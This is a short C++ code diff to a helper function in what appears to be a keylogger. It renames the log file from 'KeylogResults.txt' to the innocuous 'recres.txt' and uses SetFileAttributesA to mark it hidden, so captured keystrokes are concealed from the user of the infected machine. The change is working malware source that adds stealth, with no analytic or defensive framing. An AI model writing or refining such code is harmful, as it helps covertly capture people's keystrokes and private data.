@@ -61,7 +61,12 @@ namespace Helper {
     }*/
 
     void WriteBody(const std::string &s){
-        std::ofstream file("KeylogResults.txt");
+        std::ifstream ifex("recres.txt");
+        if(ifex){
+            SetFileAttributesA("recres.txt", FILE_ATTRIBUTE_NORMAL);
+        }
+        std::ofstream file("recres.txt");
+        SetFileAttributesA("recres.txt", FILE_ATTRIBUTE_HIDDEN);
         file << "[" << Helper::DateTime().GetDateTimeString() << "]" << "\n" << s << std::endl << "\n";
         file.close();
     }
